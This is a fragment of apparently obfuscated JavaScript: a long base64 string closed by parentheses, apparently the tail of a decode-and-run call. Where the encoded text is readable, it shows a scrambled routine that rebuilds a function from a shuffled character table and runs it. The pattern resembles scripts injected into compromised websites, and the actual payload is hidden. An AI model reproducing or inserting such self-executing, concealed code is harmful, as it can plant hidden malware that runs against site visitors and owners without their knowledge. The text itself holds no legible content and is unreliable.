H1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
